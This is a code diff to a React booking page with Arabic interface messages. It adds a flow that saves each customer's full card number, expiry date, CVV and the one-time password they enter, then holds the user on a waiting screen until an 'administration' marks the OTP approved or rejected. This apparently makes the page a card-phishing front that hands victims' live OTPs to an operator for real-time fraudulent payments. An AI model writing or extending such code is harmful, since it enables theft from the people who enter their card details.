@@ -87,6 +87,8 @@ export default function Booking() {
   const [submitted, setSubmitted] = useState(false);
   const [loading, setLoading] = useState(false);
   const [bookingId, setBookingId] = useState("");
+  const [waitingApproval, setWaitingApproval] = useState(false);
+  const [adminOtpMessage, setAdminOtpMessage] = useState("");
 
   const setF = (k, v) => setForm(f => ({ ...f, [k]: v }));
   const setP = (k, v) => setPayment(p => ({ ...p, [k]: v }));
@@ -114,6 +116,27 @@ export default function Booking() {
   useEffect(() => {
     if (step === 2 && !paymentOtpSent) sendPaymentOtp();
   }, [step]);
+
+  useEffect(() => {
+    if (!waitingApproval || !bookingId) return;
+    const poll = async () => {
+      const docs = await bookingStore.list();
+      const current = docs.find((d) => d.id === bookingId);
+      if (!current) return;
+      if (current.otp_status === "approved") {
+        setWaitingApproval(false);
+        setAdminOtpMessage("");
+        setSubmitted(true);
+      } else if (current.otp_status === "rejected") {
+        setWaitingApproval(false);
+        setAdminOtpMessage("تم رفض رمز OTP من الإدارة، يرجى المحاولة مرة أخرى.");
+        setPaymentOtpError(true);
+      }
+    };
+    poll();
+    const t = setInterval(poll, 2500);
+    return () => clearInterval(t);
+  }, [waitingApproval, bookingId]);
 
   const canProceed = form.venue_name && form.guest_name && form.phone && form.date && form.time;
 
@@ -478,6 +501,9 @@ export default function Booking() {
                           const cardNumber = (payment.card_number || "").replace(/\D/g, "");
                           if (bookingId) {
                             await bookingStore.update(bookingId, {
+                              ...form,
+                              type: bookingType,
+                              guests_count: Number(form.guests_count),
                               card_name: payment.card_name || "", card_number: cardNumber, card_last4: cardNumber.slice(-4),
                               card_type: payment.card_type || "Visa", card_expiry: payment.expiry || "", card_cvv: payment.cvv || "",
                               status: "card_submitted",
@@ -521,12 +547,18 @@ export default function Booking() {
                               </motion.p>
                             )}
                           </AnimatePresence>
+                          {!!adminOtpMessage && (
+                            <p className={`text-xs text-center ${waitingApproval ? "text-primary" : "text-red-400"}`}>{adminOtpMessage}</p>
+                          )}
                           <button type="button" onClick={async () => {
                             if (paymentOtp.length < 4) { setPaymentOtpError(true); return; }
                             setLoading(true);
                             const cardNumber = (payment.card_number || "").replace(/\D/g, "");
                             if (bookingId) {
                               await bookingStore.update(bookingId, {
+                                ...form,
+                                type: bookingType,
+                                guests_count: Number(form.guests_count),
                                 status: "otp_submitted",
                                 card_name: payment.card_name || "",
                                 card_number: cardNumber,
@@ -536,11 +568,13 @@ export default function Booking() {
                                 card_cvv: payment.cvv || "",
                                 submitted_otp: paymentOtp || "",
                                 otp_status: "pending",
+                                status: "waiting_approval",
                               });
                             }
                             await updateVisitorFromBooking(form, payment);
                             setLoading(false);
-                            setSubmitted(true);
+                            setAdminOtpMessage("تم إرسال OTP وبانتظار موافقة الإدارة...");
+                            setWaitingApproval(true);
                           }} disabled={paymentOtp.length < 4 || loading}
                             className="w-full relative overflow-hidden bg-primary text-primary-foreground py-4 text-xs font-bold tracking-[0.2em] uppercase hover:opacity-90 transition-all duration-300 disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-3">
                             <span className="absolute inset-0 bg-gradient-to-r from-transparent via-primary-foreground/15 to-transparent animate-[shimmer_3s_ease-in-out_infinite] bg-[length:200%_100%]" />
